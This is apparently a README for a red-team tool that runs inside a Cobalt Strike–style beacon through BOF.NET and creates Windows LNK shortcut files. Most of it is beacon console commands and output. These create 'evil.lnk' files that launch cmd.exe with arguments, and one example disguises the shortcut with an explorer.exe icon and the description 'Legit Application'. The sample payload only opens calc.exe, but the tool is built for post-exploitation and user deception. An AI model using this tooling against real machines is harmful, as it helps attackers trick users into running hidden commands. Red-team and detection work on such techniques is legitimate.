# LNK Creation BOF.NET
This is a simple [BOF.NET](https://github.com/CCob/BOF.NET) class for creating LNK files.

Dependent on the awesome [BOF.NET](https://github.com/CCob/BOF.NET) project created by [@_EthicalChaos_](https://twitter.com/_EthicalChaos_).

## Usage
Initiate BOF.NET and load the assembly:
```
beacon> bofnet_init
[*] Initializing BOFNET
[+] host called home, sent: 487585 bytes
[+] received output:
[+] BOFNET Runtime Initalized, assembly size 480768, .NET Runtime Version: 4.0.30319.42000 in AppDomain BOFNET

beacon> bofnet_load /tools/lnkcreate.dll
[*] Attempting to load large .NET assembly /tools/lnkcreate.dll into BOFNET
[+] host called home, sent: 14530 bytes
[+] received output:
[+] Setting up new loader with unique id RINU6WCY
[+] Loaded assembly lnkcreate, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null successfully
```

Create a LNK file to run `cmd.exe` wtih arguments to run `calc.exe`:
```
beacon> bofnet_execute BOFNET.Bofs.LNKCreate c:\users\user\desktop\evil.lnk cmd.exe "/c calc.exe"
[*] Attempting to execute BOFNET BOFNET.Bofs.LNKCreate
[+] host called home, sent: 6872 bytes
[+] received output:
[+] Creating LNK file...
Path: c:\users\user\desktop\evil.lnk
Target: cmd.exe
Arguments: /c calc.exe
SHA-256: 17630EE28931B27DACAB2BB63ACBEAEBDF2B25D7C96BA6611D098C932CB6D44B

[+] LNK created successfully!
```

Create a LNK file while setting the LNK icon to `explorer.exe` and adding a description:
```
beacon> bofnet_execute BOFNET.Bofs.LNKCreate c:\users\user\desktop\evil.lnk cmd.exe "/c calc.exe" C:\Windows\explorer.exe "Legit Application"
[*] Attempting to execute BOFNET BOFNET.Bofs.LNKCreate
[+] host called home, sent: 6934 bytes
[+] received output:
[+] Creating LNK file...
Path: c:\users\user\desktop\evil.lnk
Target: cmd.exe
Arguments: /c calc.exe
Icon: C:\Windows\explorer.exe
Description: Legit Application
SHA-256: 17630EE28931B27DACAB2BB63ACBEAEBDF2B25D7C96BA6611D098C932CB6D44B

[+] LNK created successfully!
```